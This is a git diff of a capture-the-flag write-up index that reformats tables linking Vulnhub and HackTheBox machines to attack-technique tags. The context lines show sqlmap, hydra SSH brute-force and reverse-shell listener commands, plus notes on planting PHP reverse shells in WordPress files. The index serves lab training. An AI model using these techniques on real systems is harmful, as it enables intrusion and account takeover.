-| 1. | 29/Oct/2019 | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) | [vulnhub#205](https://www.vulnhub.com/entry/lazysysadmin-1,205/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
   
   
 ---
@@ -1577,9 +1577,9 @@ mssqlclient.py -windows-auth "<username>@<targetip>"
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Apr/2020 | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) |  | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [hackthebox#archetype](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
   
   
 ---
@@ -1605,9 +1605,9 @@ nc -nlvp <attackerport> ## listen for incoming reverse shell connection
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Apr/2020 | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) |  | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [hackthebox#archetype](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
   
   
 ---
@@ -1619,12 +1619,12 @@ sqlmap -u "http://<targetip>:<targetport>/<vulnwebapp>/index.php" --batch --form
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 13/Nov/2019 | [CronOS](https://github.com/7h3rAm/writeups/blob/master/htb.cronos/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.cronos/killchain.png" width="100" height="100" /> |
-| 2. | 10/Oct/2019 | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> |
-| 3. | 08/Oct/2019 | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> |
-| 4. | 28/Sep/2019 | [Kioptrix: Level 1.1 (#2)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [CronOS](https://github.com/7h3rAm/writeups/blob/master/htb.cronos/writeup.pdf) | [hackthebox#11](https://www.hackthebox.eu/home/machines/profile/11) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.cronos/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron) |
+| 2. | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) | [vulnhub#129](https://www.vulnhub.com/entry/lord-of-the-root-101,129/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
+| 3. | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) | [vulnhub#25](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
+| 4. | [Kioptrix: Level 1.1 (#2)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf) | [vulnhub#23](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend) |
   
   
 ---
@@ -1632,10 +1632,10 @@ sqlmap -u "http://<targetip>:<targetport>/<vulnwebapp>/index.php" --batch --form
 #### exploit_ssh_authorizedkeys [⇡](#exploit)  
 if we have access to a user's `.ssh` directory, copy our `id_rsa.pub` file to `.ssh/authorized_keys` to obtain passwordless ssh access  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 10/Oct/2019 | [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf) |  | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100" /> |
-| 2. | 20/Sep/2019 | [HackLAB: Vulnix](https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf) |  | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_nfs_norootsquash`](https://github.com/7h3rAm/writeups#privesc_nfs_norootsquash), [`privesc_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#privesc_ssh_authorizedkeys) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf) | [vulnhub#244](https://www.vulnhub.com/entry/linsecurity-1,244/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100" /> | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group) |
+| 2. | [HackLAB: Vulnix](https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf) | [vulnhub#48](https://www.vulnhub.com/entry/hacklab-vulnix,48/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/killchain.png" width="100" height="100" /> | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_nfs_norootsquash`](https://github.com/7h3rAm/writeups#privesc_nfs_norootsquash), [`privesc_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#privesc_ssh_authorizedkeys) |
   
   
 ---
@@ -1647,18 +1647,18 @@ hydra -l anne -P "/usr/share/wordlists/rockyou.txt" -e nsr -s 22 ssh://<targetip
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 09/Sep/2019 | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) |  | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [vulnhub#231](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
 <a name="exploit_ssh_privatekeys"></a>
 #### exploit_ssh_privatekeys [⇡](#exploit)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 10/Aug/2020 | [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf) | [vulnhub#508](https://www.vulnhub.com/entry/infosec-prep-oscp,508/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100" /> | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash) |
   
   
 ---
@@ -1679,9 +1679,9 @@ strings dump.bin
 #### exploit_wordpress_defaultcreds [⇡](#exploit)  
 target system has wordpress configured with default credentials `admin/admin`  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 18/Sep/2019 | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) | [vulnhub#180](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) |
   
   
 ---
@@ -1689,9 +1689,9 @@ target system has wordpress configured with default credentials `admin/admin`
 #### exploit_wordpress_plugin [⇡](#exploit)  
 certain wordpress installations might have a `/plugins/` directory that could provide source files or leak sensitive information  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 13/Nov/2019 | [Blocky](https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blocky/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Blocky](https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf) | [hackthebox#48](https://www.hackthebox.eu/home/machines/profile/48) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blocky/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
@@ -1699,9 +1699,9 @@ certain wordpress installations might have a `/plugins/` directory that could pr
 #### exploit_wordpress_plugin_activitymonitor [⇡](#exploit)  
 wordpress plugin `Plainview Activity Monitor` is vulnerable to remote command injection  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 10/Sep/2019 | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) | [vulnhub#315](https://www.vulnhub.com/entry/dc-6,315/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) |
   
 [+] https://www.exploit-db.com/exploits/45274  
   
@@ -1710,10 +1710,10 @@ wordpress plugin `Plainview Activity Monitor` is vulnerable to remote command in
 #### exploit_wordpress_plugin_hellodolly [⇡](#exploit)  
 wordpress plugin `Hello Dolly` (default on stock wp installs) file `hello.php` is modified with php reverse shell code to gain interactive access on the target system  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 18/Sep/2019 | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> |
-| 2. | 09/Sep/2019 | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) |  | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) | [vulnhub#180](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) |
+| 2. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [vulnhub#231](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
@@ -1721,9 +1721,9 @@ wordpress plugin `Hello Dolly` (default on stock wp installs) file `hello.php` i
 #### exploit_wordpress_template [⇡](#exploit)  
 edit a wordpress template file, like `404.php` and add php reverse shell code within it to gain interactive access on the target system  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 29/Oct/2019 | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
